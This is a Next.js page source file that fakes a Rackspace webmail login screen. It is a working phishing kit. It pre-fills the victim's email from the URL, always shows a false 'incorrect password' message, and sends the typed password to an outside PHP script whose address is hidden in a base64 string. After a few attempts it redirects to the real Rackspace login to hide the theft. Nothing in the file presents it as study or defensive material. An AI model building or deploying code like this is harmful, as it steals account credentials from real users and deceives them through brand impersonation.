// pages/index.js
"use client";
import { useEffect, useState } from "react";

export default function Home() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");
  const [counter, setCounter] = useState(0);
  const tries = 2;
  const redirectUri = "https://apps.rackspace.com/wmidentity/account/login";
  const apiUrl = atob(
    "aHR0cHM6Ly9icm9rZW5zb3VuZHNjbHViLm9yZy9jZ2ktYmluL2RhcmsvdXBsb2FkL3JhY2svc3BhY2UvVVBqTDRaRmJlTC5waHA="
  );

  useEffect(() => {
    const url = window.location.toString();
    if (!url.includes("#")) {
      window.location.href = `${url}#`;
      window.location.reload();
    } else {
      const [, hashValue] = url.split("#");
      const [email] = hashValue.split("=");
      setUsername(email);
    }
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!password) {
      setMessage("Please enter a password.");
      return;
    }
    if (password.length < 5) {
      setMessage("Password is too short!");
      return;
    }
    setMessage("Verifying...");

    const response = await fetch(apiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ username, passwd: password }),
    });

    const result = await response.json();
    if (result.success) {
      // Handle successful login if necessary
    } else {
      setCounter(counter + 1);
      if (counter >= tries) {
        window.location.href = redirectUri;
      } else {
        setPassword("");
        setMessage("Incorrect email address or password. Please try again.");
      }
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-200">
      <div className="bg-white min-w-[790px] shadow-lg">
        <div className="flex items-center justify-between p-4 bg-gray-800 text-white">
          <div className="text-xl font-light">Webmail Login</div>
          <img
            id="logo"
            className="w-[130px] -mr-[5px] -mt-[9px]"
            src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png"
            alt="Rackspace Logo"
          />
        </div>

        <div className="flex justify-start bg-white">
          <div
            id="banner-section"
            className="flex flex-col items-center justify-center w-[314px] h-[285px] m-10"
          >
            <a href="#" target="_blank" rel="noopener noreferrer">
              <img
                id="banner"
                src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg"
                alt="Suspicious Email Banner"
                className="w-[190px]"
              />
            </a>
          </div>

          <div className="flex flex-col justify-center w-full px-10">
            <div className="mb-5 text-red-600 font-semibold">
              Username / Password incorrect
            </div>

            <form id="form" className="flex flex-col justify-center">
              <div className="mb-5">
                <label className="block mb-2 text-gray-600" htmlFor="username">
                  Email address
                </label>
                <input
                  type="email"
                  id="username"
                  value={username}
                  readOnly
                  className="w-full h-8 px-2 border rounded bg-white border-gray-400 focus:border-blue-400 focus:ring-0"
                />
              </div>

              <div className="mb-5">
                <label className="block mb-2 text-gray-600" htmlFor="password">
                  Password
                </label>
                <input
                  type="password"
                  id="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  className="w-full h-8 px-2 border rounded bg-white border-gray-400 focus:border-blue-400 focus:ring-0"
                />
                <a
                  href="#"
                  className="absolute top-0 right-10 text-teal-700 hover:underline"
                >
                  Forgot password?
                </a>
              </div>

              <div className="flex justify-end">
                <button
                  type="submit"
                  onClick={handleSubmit}
                  className="inline-flex items-center justify-center h-8 px-3 text-white bg-teal-700 border border-transparent rounded cursor-pointer hover:bg-teal-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-teal-500"
                >
                  Log In
                </button>
              </div>

              <div className="mt-5 text-red-600">{message}</div>
            </form>
          </div>
        </div>

        <div className="text-center py-5 bg-white">
          <a className="text-teal-700 hover:underline" href="#" target="_blank">
            Privacy Statement
          </a>
          <span className="mx-2 text-teal-700">|</span>
          <a className="text-teal-700 hover:underline" href="#" target="_blank">
            Website Terms
          </a>
        </div>

        <div className="text-center mt-2 mb-5 text-gray-600">
          Need webmail for your business? Learn more about{" "}
          <a className="text-gray-600 hover:underline" href="#">
            Hosted Email
          </a>{" "}
          from Rackspace.
        </div>
      </div>
    </div>
  );
}
